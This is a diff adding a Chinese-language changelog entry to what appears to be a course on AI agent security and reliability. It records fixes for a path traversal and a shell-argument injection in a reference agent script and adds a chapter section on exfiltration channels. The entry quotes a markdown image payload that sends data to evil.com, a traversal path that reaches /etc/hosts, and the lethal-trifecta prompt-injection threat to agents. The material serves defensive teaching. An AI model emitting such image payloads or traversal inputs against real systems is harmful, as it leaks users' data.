@@ -23,6 +23,45 @@ tags: [meta, changelog]
 
 ---
 
+## v1.3.3 — 2026-05-24
+
+**第二轮 SRE 跟读后的修订**：以 SRE 身份按 Unit 1 W1 方法对参考代码做了一次真实 trifecta 分析，挖到两个**真安全 bug**；同时补齐 Active Recall 题库的 v1.3.0 新增章节缺漏，统一跨文件不一致的数字。
+
+### 修订（结构性 / 安全）
+- **[代码/02-minimal-agent.py 修两个真 bug](../代码/02-minimal-agent.py)** ——
+    - **read_file path traversal**：`startswith("/tmp/")` 通过但 `open(path)` 不做 path normalize → `/tmp/../etc/hosts` 真的读到 hosts。改为 `os.path.realpath()` 解开 `..` 和符号链接后再做前缀检查。**亲手验证修复有效**。
+    - **run_shell 参数注入**：白名单只检查 `command.split()[0]`，`ls /root` 通过检查。改为**命令 + 参数双层白名单**：模型只能选预设 command 名（`ls_tmp`、`ls_var_log` 等），参数被服务端硬编码。
+- **[第 6 章 / 深入 07 加两类被低估的外泄通道](../知识/06-AI自治与上下文架构约束.md#致命三角lethal-trifecta)** ——
+    - **Markdown image / link 自动渲染**：模型在回答里嵌入 `![](http://evil.com/log?data=...)`，凡是 web 前端自动渲染 markdown 就被动外带数据
+    - **人作为 egress hop**：操作者把 Agent 输出粘贴到工单 / chat / 邮件，人传人绕开技术防御
+    - 加 "CLI demo 安全 ≠ Web 产品安全" 警示
+- **[复习/Active Recall 题库补 深入 09-12](../复习/Active-Recall题库.md)** —— v1.3.0 新增了深入 11/12 但题库没跟进。补 12 道题，覆盖"该不该用 AI / 事故 pattern 识别 / 自治成熟度 / 选型决策"。
+- **[复习/核心概念卡 + anki-import.csv tokenizer 数字统一](../复习/核心概念卡.md)** —— "比 Sonnet 多 ~26%" → "多约 35%"（与术语表 1.35× 口径一致）。
+
+### 修订（一致性 / 体验）
+- **[Capstone 加 A/B/C/D 评级判据](../练习/Capstone-AI生产架构评审包.md)** + **Unit 5 D 档读者 § 11 替代方案** + **自学者同伴 review 的替代**
+- **[附录 E 模板 9 加 Defer 档](../附录/E-模板库.md)** —— Go/Conditional Go/Defer/No-Go 四档
+- **[Unit 2 W1 加贯穿项目读者指引](../练习/Unit2-TraceEval统一可观测性/Week1-Trace-Eval一体化.md)** —— 画 as-is + to-be 而不是假设有现成 trace 系统
+- **[Unit 3 W2 加 workload 数据从哪来速查](../练习/Unit3-推理SLO与静默降级/Week2-容量规划.md)** —— 贯穿项目 / 真实工作 / 无数据三档替代方案
+- **[Unit 4 W2 加"verifier 不该叠"指引](../练习/Unit4-复合AI可靠性数学/Week2-Verifier设计.md)** —— Verifier 之间应正交，不同维度查不同失败模式
+- **[Unit 1 W1 致命三角链接固定 URL](../练习/Unit1-Agent自治与致命三角/Week1-致命三角初识.md)** —— 不再依赖站内搜索
+- **[复习 README 加手工跟踪表格示例](../复习/README.md)** + 推荐替代 SR 软件清单
+- **[学习路线图 · 路线 B 时长改为 2-4 周（每天 1 小时）](../学习路线图.md)** —— 1-2 周不现实
+- **[Unit 5 D 档加补做触发点](../练习/Unit5-数值与编译器级调试/总览.md)** —— 公司有 GPU / on-call 触发 / 半年自检三档触发条件
+- **[附录 A 自检表扩到 12 个月](../附录/A-每月自检表.md)**
+- **[附录 C 加精度字节表](../附录/C-术语表.md)** —— fp32/bf16/fp16/int8/int4 各几字节
+- **[月度清单 A5 加 csv 同步必检](../维护/月度更新清单.md)** —— 概念卡和 anki csv 任何 Q/A 改动必须同步
+
+### 元反馈
+- **真安全 bug 来自实做**：以 SRE 身份按 Unit 1 W1 真的对 02-minimal-agent.py 跑了一遍 trifecta，亲手 `python3` 验证发现 path traversal 真的能读到 /etc/hosts、ls /root 真的能执行。**对着代码读不出来，必须动手验证**。
+- **第一轮加的 sanitize_tool_result 是必要但不充分**：应用层做了净化，但工具本身的 path traversal 和参数注入仍是真攻击面。"应用层 + 工具层 + 基础设施层"三层都得做。
+
+### 为什么是 patch 版本
+- 没新增章节，没框架变化。
+- 但本版含**真安全 bug 修复**（H1/H2）——下游用户应升级（如果之前 copy 过 02-minimal-agent.py，必须重新 copy 或手动 backport 这两处修复）。
+
+---
+
 ## v1.3.2 — 2026-05-24
 
 **SRE 视角跟读后的结构性修订**：以 SRE 身份按书的方法走完 Track A 主线 + Unit 0 实做后，整理出的 19 条问题清单（高/中/低/读者体验），本版消化全部高优先级与中优先级，覆盖结构性缺陷、参考代码与正文一致性、读者体验首要痛点。
